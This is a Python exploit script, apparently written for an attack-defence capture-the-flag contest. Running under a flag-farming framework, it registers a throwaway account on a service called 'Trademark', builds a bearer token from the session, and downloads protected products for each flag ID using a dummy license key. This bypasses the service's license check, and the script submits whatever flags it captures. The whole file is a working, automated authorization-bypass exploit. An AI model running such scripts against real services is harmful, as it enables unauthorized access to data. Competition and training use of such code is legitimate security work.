from base64 import b64encode
from string import ascii_lowercase, ascii_uppercase
from requests import post
from pyfarmer import farm, random_string, print_exception, get_ids, submit_flag


def main(ip: str) -> None:
    auth = random_string(8, ascii_lowercase + ascii_uppercase)
    r = post(
        f"http://{ip}:5000/api/register",
        data={"username": auth, "password": auth},
    )
    r_json = r.json()
    bearer = b"Bearer " + b64encode(f'{r_json["user_id"]}:{r_json["session"]}'.encode())
    for flag_id in get_ids("http://10.10.0.1:8081/flagIds", "Trademark"):
        try:
            r = post(
                f"http://{ip}:5000/api/products/{flag_id}/download",
                data={"license": "AAAAAAA-AAAAAAA-AAAAAAA-AAAAAAA"},
                headers={"Authorization": bearer},
            )
            submit_flag(r.text)
        except:
            print_exception()


if __name__ == "__main__":
    farm(main, __file__)
